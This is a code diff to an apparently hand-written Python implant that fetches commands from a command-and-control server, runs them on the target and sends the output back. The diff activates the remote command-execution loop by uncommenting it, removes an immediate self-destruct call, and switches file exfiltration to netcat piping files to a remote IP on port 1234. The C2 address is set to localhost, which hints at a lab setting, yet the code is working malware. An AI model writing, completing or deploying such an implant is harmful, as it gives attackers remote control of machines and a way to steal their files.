@@ -12,7 +12,7 @@ c2IPAdress = 'localhost'
 #This will upload a file to the target server.
 def ExfilFile(file, c2, IPAddress):
     urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
-    os.system(f'Ncat {IPAddress} 1234 < {file}')
+    os.system(f'nc {IPAddress} 1234 < {file}')
     return
 
 #This will download the new version of the implant, and then run it as a subprocess.
@@ -23,7 +23,7 @@ def updateImplant():
 
 #This will self destruct our implant.
 def selfDestruct():
-    os.system('del sid.log; del implant.py')
+    os.system('rm sid.log; rm implant.py')
     destructMsg = urllib.parse.quote_plus("Implant has self destructed")
     urllib.request.urlopen(f'{c2}/info?info={destructMsg}&sid={sid}')
     return
@@ -38,10 +38,8 @@ else:
     f.write(sid)
     f.close()
 
-selfDestruct()
-
 # Command execution
-"""time.sleep(2)
+time.sleep(2)
 response = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}')
 command = response.read().decode("utf-8")
 os.system(command) #runs the command from our C2 server on the target
@@ -49,4 +47,4 @@ commanddata = os.popen(command)
 commanddatatext = urllib.parse.quote_plus(commanddata.read())
 
 #Send command output to C2
-urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')"""
+urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
